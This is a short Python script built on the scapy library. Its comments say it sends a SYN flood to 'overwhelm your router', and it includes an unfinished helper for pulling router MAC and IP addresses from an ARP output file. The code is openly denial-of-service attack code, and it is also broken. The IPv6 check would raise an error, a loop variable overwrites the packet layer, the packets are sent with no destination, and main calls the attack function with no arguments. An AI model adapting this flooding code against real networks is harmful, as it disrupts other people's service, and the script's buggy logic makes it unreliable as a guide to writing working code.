from scapy.all import *
import argparse

# Generates packets to overwhelm your router

# Determines if a given address is IPv4 or v6
def is_ipv6(address):
    return address.index(":") != -1


# Generates SYN flood
def spam_router(router_mac, router_ip):
    e = Ether(router_mac)
    t = TCP(flags="S")
    if is_ipv6(router_ip):
        i = IPv6()
    else:
        i = IP()
    i.dst = router_ip
    for i in range(10):
        # TODO let the user specify the interface they wish to use
        sendp(e / IP() / t)


# Finds MAC addresses in the text file
def extract_mac():
    with open("arp_query.txt") as fin:
        lines = fin.readlines()
        # TODO extract MAC and IP addresses with regex


def main():
    spam_router()


if __name__ == "__main__":
    main()
